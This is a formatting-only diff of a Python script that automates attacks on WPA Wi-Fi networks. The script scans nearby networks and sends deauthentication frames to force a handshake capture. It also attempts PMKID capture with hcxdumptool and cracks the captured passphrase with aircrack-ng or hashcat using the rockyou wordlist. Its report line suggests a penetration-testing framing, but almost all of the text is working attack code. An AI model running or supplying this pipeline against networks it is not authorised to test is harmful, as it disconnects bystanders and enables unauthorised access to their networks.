@@ -15,7 +15,9 @@ def check_tools():
     tools = {}
     for tool in ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "hashcat"]:
         result = subprocess.run(
-            ["which", tool], capture_output=True, text=True,
+            ["which", tool],
+            capture_output=True,
+            text=True,
             timeout=120,
         )
         tools[tool] = result.stdout.strip() if result.returncode == 0 else None
@@ -25,7 +27,9 @@ def check_tools():
 def list_interfaces():
     """List wireless interfaces."""
     result = subprocess.run(
-        ["iw", "dev"], capture_output=True, text=True,
+        ["iw", "dev"],
+        capture_output=True,
+        text=True,
         timeout=120,
     )
     interfaces = re.findall(r"Interface\s+(\S+)", result.stdout)
@@ -36,7 +40,9 @@ def enable_monitor_mode(iface="wlan0"):
     """Enable monitor mode on wireless interface."""
     subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, timeout=120)
     result = subprocess.run(
-        ["airmon-ng", "start", iface], capture_output=True, text=True,
+        ["airmon-ng", "start", iface],
+        capture_output=True,
+        text=True,
         timeout=120,
     )
     mon_match = re.search(r"monitor mode .* enabled on (\S+)", result.stdout)
@@ -48,7 +54,8 @@ def scan_networks(mon_iface="wlan0mon", duration=15, output_prefix="/tmp/scan"):
     """Scan for nearby wireless networks."""
     proc = subprocess.Popen(
         ["airodump-ng", mon_iface, "-w", output_prefix, "--output-format", "csv"],
-        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
     )
     time.sleep(duration)
     proc.send_signal(signal.SIGINT)
@@ -73,26 +80,41 @@ def scan_networks(mon_iface="wlan0mon", duration=15, output_prefix="/tmp/scan"):
                 essid = fields[13]
                 power = fields[8]
                 if bssid and len(bssid) == 17:
-                    networks.append({
-                        "bssid": bssid, "channel": channel,
-                        "encryption": encryption, "essid": essid,
-                        "power": power,
-                    })
+                    networks.append(
+                        {
+                            "bssid": bssid,
+                            "channel": channel,
+                            "encryption": encryption,
+                            "essid": essid,
+                            "power": power,
+                        }
+                    )
     return networks
 
 
-def capture_handshake(mon_iface, bssid, channel, output_prefix="/tmp/handshake",
-                      timeout=120):
+def capture_handshake(
+    mon_iface, bssid, channel, output_prefix="/tmp/handshake", timeout=120
+):
     """Capture WPA handshake from target network."""
     proc = subprocess.Popen(
-        ["airodump-ng", "-c", str(channel), "--bssid", bssid,
-         "-w", output_prefix, mon_iface],
-        stdout=subprocess.PIPE, stderr=subprocess.PIPE
+        [
+            "airodump-ng",
+            "-c",
+            str(channel),
+            "--bssid",
+            bssid,
+            "-w",
+            output_prefix,
+            mon_iface,
+        ],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
     )
     time.sleep(5)
     subprocess.run(
         ["aireplay-ng", "-0", "5", "-a", bssid, mon_iface],
-        capture_output=True, timeout=30
+        capture_output=True,
+        timeout=30,
     )
     time.sleep(timeout)
     proc.send_signal(signal.SIGINT)
@@ -118,10 +140,18 @@ def try_pmkid_capture(mon_iface, bssid, channel, timeout=30):
     output_file = "/tmp/pmkid.pcapng"
     try:
         proc = subprocess.Popen(
-            ["hcxdumptool", "-i", mon_iface, "-o", output_file,
-             "--enable_status=1", "--filtermode=2",
-             f"--filterlist_ap={bssid}"],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            [
+                "hcxdumptool",
+                "-i",
+                mon_iface,
+                "-o",
+                output_file,
+                "--enable_status=1",
+                "--filtermode=2",
+                f"--filterlist_ap={bssid}",
+            ],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
         )
         time.sleep(timeout)
         proc.send_signal(signal.SIGINT)
@@ -145,7 +175,9 @@ def crack_with_aircrack(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
         return {"error": f"Wordlist not found: {wordlist}"}
     result = subprocess.run(
         ["aircrack-ng", cap_file, "-w", wordlist],
-        capture_output=True, text=True, timeout=3600
+        capture_output=True,
+        text=True,
+        timeout=3600,
     )
     key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", result.stdout)
     if key_match:
@@ -153,16 +185,27 @@ def crack_with_aircrack(cap_file, wordlist="/usr/share/wordlists/rockyou.txt"):
     return {"cracked": False, "tool": "aircrack-ng"}
 
 
-def crack_with_hashcat(hash_file, wordlist="/usr/share/wordlists/rockyou.txt",
-                       hash_mode=22000):
+def crack_with_hashcat(
+    hash_file, wordlist="/usr/share/wordlists/rockyou.txt", hash_mode=22000
+):
     """Crack WPA hash using hashcat with GPU acceleration."""
     if not os.path.exists(wordlist):
         return {"error": f"Wordlist not found: {wordlist}"}
     try:
         result = subprocess.run(
-            ["hashcat", "-m", str(hash_mode), hash_file, wordlist,
-             "--force", "-o", "/tmp/hashcat_cracked.txt"],
-            capture_output=True, text=True, timeout=7200
+            [
+                "hashcat",
+                "-m",
+                str(hash_mode),
+                hash_file,
+                wordlist,
+                "--force",
+                "-o",
+                "/tmp/hashcat_cracked.txt",
+            ],
+            capture_output=True,
+            text=True,
+            timeout=7200,
         )
         cracked_file = "/tmp/hashcat_cracked.txt"
         if os.path.exists(cracked_file) and os.path.getsize(cracked_file) > 0:
@@ -176,7 +219,9 @@ def crack_with_hashcat(hash_file, wordlist="/usr/share/wordlists/rockyou.txt",
 def disable_monitor_mode(mon_iface="wlan0mon"):
     """Disable monitor mode and restore managed mode."""
     subprocess.run(["airmon-ng", "stop", mon_iface], capture_output=True, timeout=120)
-    subprocess.run(["systemctl", "restart", "NetworkManager"], capture_output=True, timeout=120)
+    subprocess.run(
+        ["systemctl", "restart", "NetworkManager"], capture_output=True, timeout=120
+    )
     return {"restored": True}
 
 
@@ -186,14 +231,20 @@ def print_report(networks, handshake, crack_result):
     print(f"Date: {datetime.now().isoformat()}")
     print(f"\nNetworks Discovered: {len(networks)}")
     for n in networks[:10]:
-        print(f"  {n['essid']:25s} {n['bssid']} ch:{n['channel']:>3s} {n['encryption']}")
-    print(f"\nHandshake Capture: {'SUCCESS' if handshake.get('handshake_captured') else 'FAILED'}")
+        print(
+            f"  {n['essid']:25s} {n['bssid']} ch:{n['channel']:>3s} {n['encryption']}"
+        )
+    print(
+        f"\nHandshake Capture: {'SUCCESS' if handshake.get('handshake_captured') else 'FAILED'}"
+    )
     print(f"  BSSID: {handshake.get('bssid')}")
     print(f"  File: {handshake.get('capture_file')}")
     if crack_result:
         if crack_result.get("cracked"):
             print(f"\nPassword Cracked: YES")
-            print(f"  Key: {crack_result.get('key', crack_result.get('result', 'N/A'))}")
+            print(
+                f"  Key: {crack_result.get('key', crack_result.get('result', 'N/A'))}"
+            )
             print(f"  Tool: {crack_result['tool']}")
             print(f"  Risk: CRITICAL - Weak passphrase")
         else:
